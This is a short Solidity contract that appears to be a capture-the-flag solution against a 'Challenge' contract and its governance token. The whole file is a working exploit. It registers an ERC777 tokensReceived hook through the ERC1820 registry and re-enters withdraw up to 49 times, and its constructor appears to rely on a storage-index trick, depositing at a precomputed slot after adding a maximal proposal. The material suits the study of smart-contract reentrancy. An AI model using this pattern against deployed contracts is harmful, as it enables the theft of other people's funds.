pragma solidity 0.8.0;

import "./ERC1820.sol";
import "./Challenge.sol";
import "./GovToken.sol";

contract Solve {
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");
    IERC1820Registry internal constant _ERC1820_REGISTRY =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    uint256 counter;
    Challenge ins;
    GovToken gov;
    uint256 idx =
        69333599395970031666789361770447006408217979913037264884925550950630767334136;

    constructor(Challenge _ins, GovToken _gov) {
        ins = _ins;
        gov = _gov;
        ins.faucet();
        ins.addProposal(type(uint256).max);
        gov.approve(address(ins), type(uint256).max);
        ins.deposit(idx, 10 ether);
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            _TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function go() public {
        ins.withdraw(idx);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (counter < 49) {
            counter++;
            ins.withdraw(idx);
        }
    }
}
